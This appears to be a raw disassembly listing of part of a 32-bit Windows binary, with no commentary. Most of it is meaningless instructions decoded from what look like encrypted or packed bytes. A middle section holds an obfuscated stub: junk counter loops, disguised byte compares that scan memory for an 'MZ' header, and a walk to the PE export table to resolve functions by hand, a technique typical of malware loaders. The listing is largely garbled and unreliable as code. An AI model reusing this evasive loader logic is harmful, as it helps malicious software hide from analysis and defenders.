  418bf4:	jo     0x418b86
  418bf6:	sbb    ch,bl
  418bf8:	xor    bl,BYTE PTR [edi+0x56]
  418bfb:	(bad)  
  418bfc:	and    bh,BYTE PTR [ebp-0x7e]
  418bff:	icebp  
  418c00:	sub    bh,dh
  418c02:	out    0xd3,eax
  418c04:	or     DWORD PTR [ecx-0x432b47e0],esi
  418c0a:	aas    
  418c0b:	dec    ecx
  418c0c:	icebp  
  418c0d:	enter  0x619e,0x6
  418c11:	aaa    
  418c12:	inc    edx
  418c13:	stos   DWORD PTR es:[edi],eax
  418c14:	mov    dl,0xf7
  418c16:	retf   0xc23b
  418c19:	pop    ebx
  418c1a:	test   DWORD PTR ds:[edi-0x3a85a4d3],edx
  418c21:	mov    al,0x6d
  418c23:	add    dh,cl
  418c25:	cld    
  418c26:	daa    
  418c27:	(bad)  
  418c28:	das    
  418c29:	inc    ecx
  418c2a:	pop    edi
  418c2b:	aam    0x26
  418c2d:	or     DWORD PTR [edi],edi
  418c2f:	(bad)  
  418c30:	stc    
  418c31:	fcomip st,st(7)
  418c33:	iret   
  418c34:	out    0x4c,al
  418c36:	sbb    BYTE PTR [ecx-0x22],ch
  418c39:	imul   edi,esp,0x15
  418c3c:	adc    ah,BYTE PTR [edx-0x26dc7bc7]
  418c42:	mov    cl,0x64
  418c44:	in     al,dx
  418c45:	es push edi
  418c47:	shr    ecx,1
  418c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c4a:	stc    
  418c4b:	push   ebp
  418c4c:	xchg   esp,ecx
  418c4e:	and    al,0x5b
  418c50:	lods   eax,DWORD PTR ds:[esi]
  418c51:	shl    BYTE PTR [ebx+0x30],0x37
  418c55:	arpl   WORD PTR [edi],cx
  418c57:	jmp    0x7f75baf2
  418c5c:	aad    0x4e
  418c5e:	sar    BYTE PTR [esi+0xefd692f],cl
  418c64:	mov    bl,0x2d
  418c66:	add    esi,ebp
  418c68:	test   al,0x36
  418c6a:	push   edi
  418c6b:	adc    eax,0xe7d0226d
  418c70:	out    dx,eax
  418c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c72:	sub    eax,0x41add20c
  418c77:	cmp    BYTE PTR [eax],dl
  418c79:	lods   al,BYTE PTR ds:[esi]
  418c7a:	mov    esp,0xd11d239e
  418c7f:	retf   
  418c80:	cld    
  418c81:	sahf   
  418c82:	(bad)  
  418c83:	jg     0x418cd7
  418c85:	inc    eax
  418c86:	dec    eax
  418c87:	push   ebx
  418c88:	out    dx,eax
  418c89:	in     eax,0xc1
  418c8b:	mov    al,ds:0xcb5db67f
  418c90:	mov    al,ds:0x4335574a
  418c95:	pop    edi
  418c96:	sub    eax,0xebc58692
  418c9b:	jae    0x418ca5
  418c9d:	or     ch,BYTE PTR [edx+0x46956e66]
  418ca3:	mov    eax,gs:0xa64e9ae7
  418ca9:	or     eax,0xd310ad03
  418cae:	xchg   esi,esp
  418cb0:	mov    DWORD PTR [edx],ecx
  418cb2:	loop   0x418cc2
  418cb4:	loop   0x418c62
  418cb6:	pop    edx
  418cb7:	add    eax,0x2aac95b2
  418cbc:	(bad)  
  418cbd:	add    cl,dh
  418cbf:	mov    ch,0xcd
  418cc1:	imul   esi,DWORD PTR [edx+0x27],0xffffffb1
  418cc5:	mov    al,ds:0x427fa40f
  418cca:	daa    
  418ccb:	ret    
  418ccc:	xor    eax,0xce4b744
  418cd1:	mov    dh,0x1e
  418cd3:	or     edi,ebp
  418cd5:	sub    DWORD PTR [ecx+0x7a123f3d],edi
  418cdb:	test   eax,ebp
  418cdd:	call   0x1b87b448
  418ce2:	aas    
  418ce3:	cmp    dh,0xfb
  418ce6:	pop    ds
  418ce7:	mov    edi,fs
  418ce9:	sahf   
  418cea:	imul   ecx,edi,0x9c92d422
  418cf0:	cmp    al,0x64
  418cf2:	push   edi
  418cf3:	data16 in al,dx
  418cf5:	ins    DWORD PTR es:[edi],dx
  418cf6:	adc    BYTE PTR [ebp-0x52],dl
  418cf9:	(bad)  
  418cfa:	in     eax,dx
  418cfb:	mov    esi,0x53969d0f
  418d00:	push   edx
  418d01:	test   DWORD PTR [ebx+edi*2],ecx
  418d04:	std    
  418d05:	xor    eax,0xdb861c8b
  418d0a:	mov    al,BYTE PTR [ecx+0x4d279b16]
  418d10:	shl    BYTE PTR [edi+eiz*8],0xba
  418d14:	xor    bl,ah
  418d16:	ja     0x418ce5
  418d18:	(bad)  
  418d19:	fsubr  DWORD PTR [esi+0x13]
  418d1c:	repnz popf 
  418d1e:	sbb    DWORD PTR [edi+0x6e],esp
  418d21:	push   esp
  418d22:	add    eax,0x8436516c
  418d27:	inc    ebx
  418d28:	enter  0x5c54,0xdf
  418d2c:	sbb    DWORD PTR [eax],esi
  418d2e:	fwait
  418d2f:	pushf  
  418d30:	cmc    
  418d31:	test   cl,ah
  418d33:	push   ebp
  418d34:	xchg   edi,eax
  418d35:	push   ss
  418d36:	pop    edi
  418d37:	les    esp,FWORD PTR [edi+esi*4+0xe]
  418d3b:	jl     0x418d9e
  418d3d:	dec    ecx
  418d3e:	xor    eax,0x5df08f68
  418d43:	add    al,0x31
  418d45:	mov    ds:0x9b9aeb69,al
  418d4a:	jb     0x418dba
  418d4c:	pop    edx
  418d4d:	xbegin 0xc271da66
  418d53:	jno    0x418d1f
  418d55:	imul   eax,DWORD PTR [ebp-0x50ded76f],0x8e318c96
  418d5f:	in     al,dx
  418d60:	xorps  xmm6,XMMWORD PTR [ebx-0x67]
  418d64:	shl    BYTE PTR [ebp+0x4e],0x75
  418d68:	adc    ah,0x9d
  418d6b:	outs   dx,BYTE PTR ds:[esi]
  418d6c:	into   
  418d6d:	ins    BYTE PTR es:[edi],dx
  418d6e:	push   esi
  418d6f:	or     DWORD PTR [edi+0x5],0x21e264cb
  418d76:	rcr    DWORD PTR [edi+eiz*8-0x1e86fc55],0xe5
  418d7e:	push   eax
  418d7f:	mov    WORD PTR gs:[edi-0x1ab53c6a],ds
  418d86:	pushf  
  418d87:	cli    
  418d88:	test   ch,cl
  418d8a:	cmp    eax,esi
  418d8c:	push   es
  418d8d:	push   eax
  418d8e:	push   ds
  418d8f:	or     al,0x56
  418d91:	sub    ecx,DWORD PTR [edx-0x474ad707]
  418d97:	xor    eax,0xb9e1a1d6
  418d9c:	fist   WORD PTR [edx]
  418d9e:	push   esp
  418d9f:	xchg   BYTE PTR [edx+0x6d60aac],bl
  418da5:	jl     0x418e22
  418da7:	mov    ch,0xf5
  418da9:	sti    
  418daa:	mov    bl,0xa9
  418dac:	(bad)  
  418dad:	punpckhdq mm2,QWORD PTR [ebx-0x6a]
  418db1:	into   
  418db2:	imul   ebp,ecx,0xffcd6868
  418db8:	dec    edi
  418db9:	fild   WORD PTR [eax]
  418dbb:	jmp    0x4477089c
  418dc0:	mov    edx,0x80f4a781
  418dc5:	sbb    DWORD PTR [eax],esi
  418dc7:	jle    0x418d79
  418dc9:	xor    ebp,ebx
  418dcb:	mov    edx,0xb11a01c5
  418dd0:	push   ebp
  418dd1:	mov    cl,0x80
  418dd3:	xchg   esi,eax
  418dd4:	pushf  
  418dd5:	retf   0x6af8
  418dd8:	imul   esp,ecx,0x673f98fd
  418dde:	imul   BYTE PTR [edi+eiz*4+0xdc82525]
  418de5:	cld    
  418de6:	(bad)  
  418de7:	shl    DWORD PTR [ebx],1
  418de9:	ror    ch,0x9c
  418dec:	inc    edi
  418ded:	jp     0x418e05
  418def:	xor    esi,esi
  418df1:	and    edx,DWORD PTR [ebx+0x385c0ca1]
  418df7:	push   ebp
  418df8:	enter  0xaa21,0x20
  418dfc:	enter  0x8b9b,0x99
  418e00:	mov    ah,0xb3
  418e02:	pop    esi
  418e03:	loop   0x418df0
  418e05:	js     0x418e64
  418e07:	jo     0x418e77
  418e09:	or     eax,edi
  418e0b:	lahf   
  418e0c:	je     0x418e5e
  418e0e:	jmp    0x418daa
  418e10:	jne    0x418e50
  418e12:	pop    esp
  418e13:	mov    ds:0xc397b7c7,eax
  418e18:	or     al,0x91
  418e1a:	xor    DWORD PTR [eax-0x53],esp
  418e1d:	sub    BYTE PTR [eax+0x35f2adfb],bl
  418e23:	(bad)  
  418e24:	pop    esp
  418e25:	jb     0x418da8
  418e27:	pop    edi
  418e28:	add    edi,DWORD PTR [ecx-0x60]
  418e2b:	inc    ebp
  418e2c:	mov    cl,0xdc
  418e2e:	(bad)  
  418e2f:	jnp    0x418eaf
  418e31:	retf   0xd10
  418e34:	hlt    
  418e35:	sub    eax,0x9464d49e
  418e3a:	cmp    BYTE PTR [edx+esi*1+0x1e],ch
  418e3e:	fistp  DWORD PTR [ebx-0x30]
  418e41:	sbb    al,0x6e
  418e43:	scas   al,BYTE PTR es:[edi]
  418e44:	xchg   esp,eax
  418e45:	and    bl,BYTE PTR [bp+di-0x6589]
  418e4a:	ror    BYTE PTR [bx+di-0x80],cl
  418e4e:	in     al,dx
  418e4f:	dec    ebp
  418e50:	jae    0x418eab
  418e52:	int3   
  418e53:	mov    al,BYTE PTR [ebx-0x17]
  418e56:	lods   eax,DWORD PTR ds:[esi]
  418e57:	jmp    0x418ed8
  418e59:	jecxz  0x418e42
  418e5b:	xchg   edi,eax
  418e5c:	and    al,0x25
  418e5e:	nop
  418e5f:	fstp   DWORD PTR [edi+edi*4]
  418e62:	test   ch,0x66
  418e65:	(bad)  
  418e66:	out    dx,eax
  418e67:	and    edi,ebp
  418e69:	jb     0x418e20
  418e6b:	push   ebp
  418e6c:	or     eax,0xa354cdc1
  418e71:	mov    ds,WORD PTR [ebx+0x62cf47ee]
  418e77:	jl     0x418e16
  418e79:	repz (bad) 
  418e7b:	(bad)  
  418e7c:	adc    al,0x13
  418e7e:	fs cmc 
  418e80:	inc    esp
  418e81:	inc    ebp
  418e82:	mov    ds:0x74cac234,al
  418e87:	xchg   esp,eax
  418e88:	(bad)  
  418e89:	loope  0x418e23
  418e8b:	inc    ebp
  418e8c:	scas   eax,DWORD PTR es:[edi]
  418e8d:	mov    bl,0xc4
  418e8f:	and    DWORD PTR ds:0x774f3afb,edi
  418e95:	nop
  418e96:	xchg   ecx,eax
  418e97:	dec    esp
  418e98:	or     al,0x1e
  418e9a:	jae    0x418ecb
  418e9c:	cwde   
  418e9d:	ja     0x418e3f
  418e9f:	mul    BYTE PTR [edx-0x67]
  418ea2:	js     0x418eb0
  418ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ea5:	jmp    0x49cc:0x46d62db9
  418eac:	bound  eax,QWORD PTR [ebx+0x2e]
  418eaf:	shr    BYTE PTR [edx+0x3d],1
  418eb2:	in     eax,0xf4
  418eb4:	push   0x88ff2ed9
  418eb9:	push   0xffffff8d
  418ebb:	lock test al,0x8f
  418ebe:	push   es
  418ebf:	call   0x1101fed5
  418ec4:	xchg   DWORD PTR [ebp-0x59aff6cf],eax
  418eca:	test   eax,0xab892e47
  418ecf:	sbb    al,0x71
  418ed1:	leave  
  418ed2:	aaa    
  418ed3:	jecxz  0x418e8f
  418ed5:	addr16 adc cl,bl
  418ed8:	jnp    0x418ebe
  418eda:	mov    al,0xdc
  418edc:	mov    eax,0x6dae20c2
  418ee1:	shl    DWORD PTR [edx+0x1e],1
  418ee4:	gs pop esi
  418ee6:	scas   eax,DWORD PTR es:[edi]
  418ee7:	and    al,0xb
  418ee9:	scas   eax,DWORD PTR es:[edi]
  418eea:	xor    DWORD PTR [ebp-0x22],edi
  418eed:	inc    esp
  418eee:	push   cs
  418eef:	mov    bl,0x46
  418ef1:	sbb    ebx,DWORD PTR [ebx]
  418ef3:	mov    ds:0x332c7e6e,al
  418ef8:	out    0x68,al
  418efa:	cmp    eax,eax
  418efc:	lock inc edx
  418efe:	cmp    dl,ah
  418f00:	or     DWORD PTR [ebp-0x2cee1d01],ebp
  418f06:	in     al,dx
  418f07:	fadd   st(1),st
  418f09:	std    
  418f0a:	int    0x11
  418f0c:	sbb    BYTE PTR [edi+0x74],0x59
  418f10:	or     DWORD PTR [esi],eax
  418f12:	xchg   edi,eax
  418f13:	fcomip st,st(2)
  418f15:	sbb    al,BYTE PTR [ebp+eax*8+0x6d8fdc1d]
  418f1c:	stos   BYTE PTR es:[edi],al
  418f1d:	jmp    0x88d0:0xe64d45c1
  418f24:	mov    eax,ds:0xcf4399ac
  418f29:	ins    BYTE PTR es:[edi],dx
  418f2a:	(bad)  
  418f2c:	inc    edi
  418f2d:	retf   
  418f2e:	sbb    dl,BYTE PTR [esp+edx*2+0x6f0ad060]
  418f35:	ins    DWORD PTR es:[edi],dx
  418f36:	push   ecx
  418f37:	out    0x31,eax
  418f39:	sub    bh,BYTE PTR [eax+ebp*8-0x78]
  418f3d:	aaa    
  418f3e:	das    
  418f3f:	scas   al,BYTE PTR es:[edi]
  418f40:	fdivr  QWORD PTR [edi+0x46e63d14]
  418f46:	or     ecx,ebx
  418f48:	hlt    
  418f49:	mov    dl,0x84
  418f4b:	add    eax,0x86098c99
  418f50:	shl    BYTE PTR [eax+ecx*2+0x14bc9750],0xb
  418f58:	inc    eax
  418f59:	stc    
  418f5a:	mov    ch,0xa3
  418f5c:	iret   
  418f5d:	sub    DWORD PTR [edi-0x315cfde6],esi
  418f63:	into   
  418f64:	in     eax,0xd4
  418f66:	and    al,0xac
  418f68:	leave  
  418f69:	aam    0x4a
  418f6b:	push   ebx
  418f6c:	mov    al,ds:0x1ddde6ed
  418f71:	mov    DWORD PTR [ebp-0x73109779],edi
  418f77:	jns    0x418fdb
  418f79:	in     eax,dx
  418f7a:	jb     0x418fe1
  418f7c:	test   BYTE PTR [esi+0x113ab8b],al
  418f82:	bound  ebx,QWORD PTR [edx]
  418f84:	js     0x418f31
  418f86:	in     al,dx
  418f87:	jne    0x418f8e
  418f89:	mov    al,0x91
  418f8b:	(bad)  
  418f8c:	in     al,0x7b
  418f8e:	les    eax,FWORD PTR [edx]
  418f90:	mov    edi,0x1775a2db
  418f95:	inc    esp
  418f96:	int3   
  418f97:	not    BYTE PTR [ebx]
  418f99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f9a:	lods   al,BYTE PTR ds:[esi]
  418f9b:	mov    ah,0x21
  418f9d:	add    ecx,DWORD PTR [ebx-0x30df7e01]
  418fa3:	stos   BYTE PTR es:[edi],al
  418fa4:	jno    0x418fce
  418fa6:	push   esi
  418fa7:	jmp    0x418fc4
  418fa9:	addr16 ret 0x39e0
  418fad:	shl    DWORD PTR [edi],0xbc
  418fb0:	mov    al,0xb8
  418fb2:	mov    bl,0x4f
  418fb4:	nop
  418fb5:	(bad)  
  418fb6:	shl    dh,cl
  418fb8:	icebp  
  418fb9:	pop    esi
  418fba:	mov    cl,0x9
  418fbc:	pop    ebp
  418fbd:	loope  0x419036
  418fbf:	clc    
  418fc0:	aaa    
  418fc1:	aam    0x23
  418fc3:	inc    ebx
  418fc4:	mov    ebx,0x15870131
  418fc9:	cmp    esp,eax
  418fcb:	inc    esi
  418fcc:	repz ret 
  418fce:	test   BYTE PTR [esi],cl
  418fd0:	mov    ecx,0x6b9798d8
  418fd5:	pushf  
  418fd6:	xchg   BYTE PTR [esi+0x5ab9c128],cl
  418fdc:	sbb    al,0x7b
  418fde:	sbb    DWORD PTR [edi],ecx
  418fe0:	(bad)  
  418fe1:	loop   0x41903e
  418fe3:	xchg   esp,eax
  418fe4:	inc    eax
  418fe5:	rol    esi,1
  418fe7:	add    dl,bl
  418fe9:	add    edx,esi
  418feb:	in     al,0xd9
  418fed:	clc    
  418fee:	retf   0xf662
  418ff1:	cmp    BYTE PTR [edi],dh
  418ff3:	mov    DWORD PTR [eax-0x4c],eax
  418ff6:	rcl    DWORD PTR [esi-0x1f37fb1],cl
  418ffc:	push   ecx
  418ffd:	jae    0x418fb8
  418fff:	div    DWORD PTR ds:0xb18030b0
  419005:	pop    ecx
  419006:	dec    esp
  419007:	and    ebx,eax
  419009:	in     al,0xe5
  41900b:	pop    edi
  41900c:	xchg   ebx,eax
  41900d:	jecxz  0x41903a
  41900f:	xchg   ebp,eax
  419010:	call   0xebce0721
  419015:	and    edx,DWORD PTR [eax-0x472f784d]
  41901b:	mov    edx,0x3272db
  419020:	add    DWORD PTR ds:0x42a008,0x5e50
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423daf
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x4244c3
  41918d:	push   0x424489
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [esp+eiz*2+0x60]
  419396:	gs mov ds,edi
  419399:	add    DWORD PTR [ecx+0x62],esp
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx+0x5e]
  4193a1:	xor    al,0x36
  4193a3:	jnp    0x4193aa
  4193a5:	xor    BYTE PTR [ebp+0x3a],dl
  4193a8:	test   eax,0x7b30cf51
  4193ad:	sub    DWORD PTR [ebx+0x6b],edx
  4193b0:	adc    al,0xe5
  4193b2:	mov    ds,eax
  4193b4:	and    al,0xce
  4193b6:	rcr    BYTE PTR [ebx],1
  4193b8:	neg    BYTE PTR ds:0x3b54a074
  4193be:	cmp    eax,0x50c87911
  4193c3:	sub    eax,0xf5e68e2e
  4193c8:	push   ecx
  4193c9:	sar    ebx,0xb
  4193cc:	sub    bl,BYTE PTR [ebx-0x1a]
  4193cf:	mov    cl,0x35
  4193d2:	xchg   esp,eax
  4193d3:	into   
  4193d4:	into   
  4193d5:	div    BYTE PTR [ebp+0xb826d66]
  4193db:	mov    esp,0xe7ff03cc
  4193e0:	aad    0xdc
  4193e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193e3:	sub    BYTE PTR [esi+ebp*8+0x562226f8],cl
  4193ea:	push   es
  4193eb:	(bad)  
  4193ec:	arpl   WORD PTR [ebp+0x74284ecf],cx
  4193f2:	pop    edi
  4193f3:	in     eax,0x41
  4193f5:	mov    ebx,0x9c849815
  4193fa:	push   ebx
  4193fb:	mov    BYTE PTR [ebx],ah
  4193fd:	dec    edi
  4193fe:	mov    eax,0x64e6eccb
  419403:	test   BYTE PTR [edi],bh
  419405:	sbb    bh,cl
  419407:	xchg   ebx,eax
  419408:	jl     0x4193a9
  41940a:	(bad)  
  41940c:	iret   
  41940d:	fs leave 
  41940f:	mov    ebp,0xc7c58ef4
  419414:	mov    dl,0x4c
  419416:	cs or  al,0x27
  419419:	out    dx,eax
  41941a:	lea    ebx,[esi+0x18]
  41941d:	pop    ecx
  41941e:	aas    
  41941f:	js     0x4193d6
  419421:	addr16 push ebp
  419423:	es sbb ah,bh
  419426:	push   0x870b55ad
  41942b:	and    al,0xa
  41942d:	neg    DWORD PTR [ebx]
  41942f:	dec    edx
  419430:	adc    BYTE PTR [edi+0x19],cl
  419433:	add    BYTE PTR [edi+ebp*1-0x44a51a72],ah
  41943a:	pop    edx
  41943b:	retf   0xe8e6
  41943e:	dec    edx
  41943f:	retf   0x5b8f
  419442:	loop   0x41944e
  419444:	jnp    0x419454
  419446:	or     DWORD PTR [eax+0x5c2ab75b],ebx
  41944c:	sbb    esi,ebp
  41944e:	push   ebp
  41944f:	pop    ecx
  419450:	adc    ecx,DWORD PTR [edi]
  419452:	mov    ebx,0xe05a2a1f
  419457:	mov    dh,0xa1
  419459:	lea    esi,[esi-0x62da131a]
  41945f:	sub    dh,bh
  419461:	and    BYTE PTR cs:[ebx+ecx*1+0x12f583d2],cl
  419469:	and    BYTE PTR [ecx-0x6edef6b3],ah
  41946f:	outs   dx,DWORD PTR ds:[esi]
  419470:	mov    ebp,0xf93e47ad
  419475:	xor    al,0x59
  419477:	sbb    dl,BYTE PTR ds:0xab5e3d12
  41947d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947f:	cwde   
  419480:	jns    0x4194a0
  419482:	inc    ecx
  419483:	add    al,0x60
  419485:	fucomip st,st(0)
  419487:	enter  0x54bb,0xb9
  41948b:	gs jle 0x41948f
  41948e:	sbb    eax,0x596661ce
  419493:	push   eax
  419494:	add    ebp,DWORD PTR [ecx+ebx*4-0x3eda23c9]
  41949b:	push   DWORD PTR [eax]
  41949d:	sar    DWORD PTR [eax+ebp*4-0x27],1
  4194a1:	inc    ecx
  4194a2:	mov    ebx,0xc120248f
  4194a7:	dec    BYTE PTR [edx+0x68]
  4194aa:	push   0x350e56a2
  4194af:	out    dx,al
  4194b0:	xchg   esp,eax
  4194b1:	mov    al,ds:0x13ef1998
  4194b6:	xchg   BYTE PTR [ebx+0x4bdc3447],al
  4194bc:	sahf   
  4194bd:	(bad)
  4194c1:	ins    BYTE PTR es:[edi],dx
  4194c2:	sub    BYTE PTR [edx-0x7c],ch
  4194c5:	or     BYTE PTR [ebp+0x51],ch
  4194c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194c9:	hlt    
  4194ca:	sar    ebx,0x14
  4194cd:	lods   eax,DWORD PTR ds:[esi]
